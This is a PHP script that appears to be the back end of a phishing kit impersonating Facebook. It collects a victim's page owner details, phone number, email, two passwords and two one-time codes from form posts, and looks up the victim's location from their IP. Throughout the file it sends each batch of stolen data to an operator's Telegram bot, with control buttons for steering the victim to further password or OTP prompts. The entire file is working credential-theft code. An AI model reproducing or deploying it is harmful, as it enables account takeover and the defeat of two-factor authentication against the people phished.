<?php
include("config.php");
session_start();

      $_SESSION['ipadd'] = $_SERVER['HTTP_CLIENT_IP'] 
   ? : ($_SERVER['HTTP_X_FORWARDED_FOR'] 
   ? : $_SERVER['REMOTE_ADDR']);


   if (isset($_SERVER['HTTPS']) &&
    ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) ||
    isset($_SERVER['HTTP_X_FORWARDED_PROTO']) &&
    $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https') {
  $protocol = 'https://';
}
else {
  $protocol = 'http://';
}
 $_SESSION['connect'] = $protocol.$_SERVER['HTTP_HOST'];

$_SESSION['dir'] = dirname($_SERVER['PHP_SELF']);


$url = $_SESSION['connect'] . $_SESSION['dir'];

//ip address 
$loc = json_decode(file_get_contents('https://ipinfo.io/'.$_SESSION['ipadd'].'/json'), true);
$country = isset($loc['country']) ? $loc['country'] : 'Unknown';
$region = isset($loc['region']) ? $loc['region'] : 'Unknown';

$_SESSION['country'] = $country;
$_SESSION['region'] = $region;
//ip address


//TELEGRAM BUTTONS

$_SESSION['buttonName1'] = "otp";
$_SESSION['buttonName2'] = "wrongpass";
$_SESSION['buttonName3'] = "redirect";
$_SESSION['buttonName4'] = "wrongotp";
$_SESSION['buttonName5'] = "invalidForm";
$_SESSION['buttonName6'] = "password";
$_SESSION['buttonName7'] = "verifycard";
$_SESSION['buttonName8'] = "businessotp";
// TELEGRAM CONTROL BUTTONS 

        $button1 = ''.$url  . '/redirect.php?key='.$_SESSION['buttonName1'].'&ip='.$_SESSION['ipadd'].'';
        $button2 = ''.$url . '/redirect.php?key='.$_SESSION['buttonName2'].'&ip='.$_SESSION['ipadd'].'';
        $button3 = ''.$url  . '/redirect.php?key='.$_SESSION['buttonName3'].'&ip='.$_SESSION['ipadd'].'';
        $button4 = ''.$url  . '/redirect.php?key='.$_SESSION['buttonName4'].'&ip='.$_SESSION['ipadd'].'';
        $button5 = ''.$url  . '/redirect.php?key='.$_SESSION['buttonName5'].'&ip='.$_SESSION['ipadd'].'';
        $button6 = ''.$url  . '/redirect.php?key='.$_SESSION['buttonName6'].'&ip='.$_SESSION['ipadd'].'';
        $button7 = ''.$url  . '/redirect.php?key='.$_SESSION['buttonName7'].'&ip='.$_SESSION['ipadd'].'';
        $button8 = ''.$url  . '/redirect.php?key='.$_SESSION['buttonName8'].'&ip='.$_SESSION['ipadd'].'';

// TELEGRAM CONTROL BUTTONS 






 if (isset($_POST['phone'])) {

        $_SESSION["owner"] = $_POST['owner'];
        $_SESSION["pname"] = $_POST['pname'];
        $_SESSION["pnumber"] = $_POST['phone'];
        $_SESSION["email"] = $_POST['emsf'];
        $_SESSION["adninfo"] = $_POST['adninfo'];





        $content = "<------Facebook------>"."\n\n".
        "owner: "."`".  $_SESSION["owner"]."`". "\n".
        "pagename: "."`".  $_SESSION["pname"]."`". "\n".
        "pnumber: "."`".  $_SESSION["pnumber"]."`". "\n".
        "email: "."`".  $_SESSION["email"]."`". "\n".
        "adninfo: ".  $_SESSION["adninfo"]. "\n\n".
        "IP: ".  $_SESSION["ipadd"]."\n".
        "Country: ".  $_SESSION['country']."\n".
        "Region: ".  $_SESSION['region'];


            // Create data
            $data = http_build_query([
                'text' => $content,
                'chat_id' => $chat_id,
                'parse_mode' => "markdown"
            ]);



                        // Create keyboard
            $keyboard = json_encode([
                "inline_keyboard" => [
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName5']),
                            "url" => urlencode($button5)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName6']),
                            "url" => urlencode($button6)
                        ]

                    ],
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName7']),
                            "url" => urlencode($button7)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName8']),
                            "url" => urlencode($button8)
                        ]
                        
                    ]
                ]
            ]);

            // Send keyboard
            $url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.$data.'&reply_markup='.$keyboard;
            $res = @file_get_contents($url);


        header ('Location: loading.php');
 
}




//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------
 if (isset($_POST['phone2'])) {

        $_SESSION["owner2"] = $_POST['owner2'];
        $_SESSION["pname2"] = $_POST['pname2'];
        $_SESSION["pnumber2"] = $_POST['phone2'];
        $_SESSION["email2"] = $_POST['emsf2'];
        $_SESSION["adninfo2"] = $_POST['adninfo2'];





        $content = "<------Facebook------>"."\n\n".
        "owner2: "."`".  $_SESSION["owner2"]."`". "\n".
        "pagename2: "."`".  $_SESSION["pname2"]."`". "\n".
        "pnumber2: "."`".  $_SESSION["pnumber2"]."`". "\n".
        "email2: "."`".  $_SESSION["email2"]."`". "\n".
        "adninfo2: ".  $_SESSION["adninfo2"]. "\n\n".
        "IP: ".  $_SESSION["ipadd"]."\n".
        "Country: ".  $_SESSION['country']."\n".
        "Region: ".  $_SESSION['region'];


            // Create data
            $data = http_build_query([
                'text' => $content,
                'chat_id' => $chat_id,
                'parse_mode' => "markdown"
            ]);



            // Create keyboard
            $keyboard = json_encode([
                "inline_keyboard" => [
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName5']),
                            "url" => urlencode($button5)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName6']),
                            "url" => urlencode($button6)
                        ]
                    ],
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName7']),
                            "url" => urlencode($button7)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName8']),
                            "url" => urlencode($button8)
                        ]
                        
                    ]
                ]
            ]);

            // Send keyboard
            $url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.$data.'&reply_markup='.$keyboard;
            $res = @file_get_contents($url);


        header ('Location: loading.php');
 
}




//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------



 if (isset($_POST['pwja'])) {


    






         $_SESSION["password"] = $_POST['pwja'];
        $content = "<------Facebook------>"."\n\n".
        "owner: ". "`".  $_SESSION["owner"]. "`". "\n".
        "pagename: "."`".  $_SESSION["pname"]."`". "\n".
        "pnumber: "."`".  $_SESSION["pnumber"]."`". "\n".
        "email: "."`".  $_SESSION["email"]."`". "\n\n".
        "Password: "."`".  $_SESSION["password"]."`". "\n\n".
        "IP: ".  $_SESSION["ipadd"]."\n".
        "Country: ".  $_SESSION['country']."\n".
        "Region: ".  $_SESSION['region'];


            // Create data
            $data = http_build_query([
                'text' => $content,
                'chat_id' => $chat_id,
                'parse_mode' => "markdown"
            ]);

            // Create keyboard
            $keyboard = json_encode([
                "inline_keyboard" => [
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName1']),
                            "url" => urlencode($button1)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName2']),
                            "url" => urlencode($button2)
                        ]
                    ],
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName7']),
                            "url" => urlencode($button7)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName8']),
                            "url" => urlencode($button8)
                        ]
                        
                    ]
                ]
            ]);

            // Send keyboard
            $url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.$data.'&reply_markup='.$keyboard;
            $res = @file_get_contents($url);


        header ('Location: loading.php');
 
}
//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------





 if (isset($_POST['pwja2'])) {


    






         $_SESSION["password2"] = $_POST['pwja2'];
        $content = "<------Facebook------>"."\n\n".
        "owner: "."`".  $_SESSION["owner"]."`". "\n".
        "pagename: "."`".  $_SESSION["pname"]."`". "\n".
        "pnumber: "."`".  $_SESSION["pnumber"]."`". "\n".
        "email: "."`".  $_SESSION["email"]."`". "\n\n".
        "Password: "."`".  $_SESSION["password"]."`". "\n\n".
        "Password 2: "."`".  $_SESSION["password2"]."`". "\n\n".
        "IP: ".  $_SESSION["ipadd"]."\n".
        "Country: ".  $_SESSION['country']."\n".
        "Region: ".  $_SESSION['region'];


            // Create data
            $data = http_build_query([
                'text' => $content,
                'chat_id' => $chat_id,
                'parse_mode' => "markdown"
            ]);

            // Create keyboard
            $keyboard = json_encode([
                "inline_keyboard" => [
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName1']),
                            "url" => urlencode($button1)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName2']),
                            "url" => urlencode($button2)
                        ]
                    ],
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName7']),
                            "url" => urlencode($button7)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName8']),
                            "url" => urlencode($button8)
                        ]
                        
                    ]
                ]
            ]);

            // Send keyboard
            $url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.$data.'&reply_markup='.$keyboard;
            $res = @file_get_contents($url);


        header ('Location: loading.php');
 
}


//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------





 if (isset($_POST['cgn'])) {


    






         $_SESSION["otp"] = $_POST['cgn'];
        $content = "<------Facebook------>"."\n\n".
        "owner: "."`".  $_SESSION["owner"]."`". "\n".
        "pagename: "."`".  $_SESSION["pname"]."`". "\n".
        "pnumber: "."`".  $_SESSION["pnumber"]."`". "\n".
        "email: "."`".  $_SESSION["email"]."`". "\n\n".
        "Password: "."`".  $_SESSION["password"]."`". "\n\n".
        "Password 2: "."`".  $_SESSION["password2"]."`". "\n\n".
        "OTP: "."`".  $_SESSION["otp"]."`". "\n\n".
        "IP: ".  $_SESSION["ipadd"]."\n".
        "Country: ".  $_SESSION['country']."\n".
        "Region: ".  $_SESSION['region'];


            // Create data
            $data = http_build_query([
                'text' => $content,
                'chat_id' => $chat_id,
                'parse_mode' => "markdown"
            ]);

            // Create keyboard
            $keyboard = json_encode([
                "inline_keyboard" => [
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName3']),
                            "url" => urlencode($button3)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName4']),
                            "url" => urlencode($button4)
                        ]
                    ],
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName7']),
                            "url" => urlencode($button7)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName8']),
                            "url" => urlencode($button8)
                        ]
                        
                    ]
                ]
            ]);

            // Send keyboard
            $url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.$data.'&reply_markup='.$keyboard;
            $res = @file_get_contents($url);


        header ('Location: loading.php');
 
}
//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------
//--------------------------------------------------------------------------------------------------------------------------------------------------------





 if (isset($_POST['cgn2'])) {


    






         $_SESSION["otp2"] = $_POST['cgn2'];
        $content = "<------Facebook------>"."\n\n".
        "owner: "."`".  $_SESSION["owner"]."`". "\n".
        "pagename: "."`".  $_SESSION["pname"]."`". "\n".
        "pnumber: "."`".  $_SESSION["pnumber"]."`". "\n".
        "email: "."`".  $_SESSION["email"]."`". "\n\n".
        "Password: "."`".  $_SESSION["password"]."`". "\n\n".
        "Password 2: "."`".  $_SESSION["password2"]."`". "\n\n".
        "OTP: "."`".  $_SESSION["otp"]."`". "\n\n".
        "OTP 2: "."`".  $_SESSION["otp2"]."`". "\n\n".
        "IP: ".  $_SESSION["ipadd"]."\n".
        "Country: ".  $_SESSION['country']."\n".
        "Region: ".  $_SESSION['region'];


            // Create data
            $data = http_build_query([
                'text' => $content,
                'chat_id' => $chat_id,
                'parse_mode' => "markdown"
            ]);

            // Create keyboard
            $keyboard = json_encode([
                "inline_keyboard" => [
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName3']),
                            "url" => urlencode($button3)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName4']),
                            "url" => urlencode($button4)
                        ]
                    ],
                    [
                        [
                            "text" => strtoupper($_SESSION['buttonName7']),
                            "url" => urlencode($button7)
                        ],
                        [
                            "text" => strtoupper($_SESSION['buttonName8']),
                            "url" => urlencode($button8)
                        ]
                        
                    ]
                ]
            ]);

            // Send keyboard
            $url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.$data.'&reply_markup='.$keyboard;
            $res = @file_get_contents($url);


        header ('Location: loading.php');
 
}



?>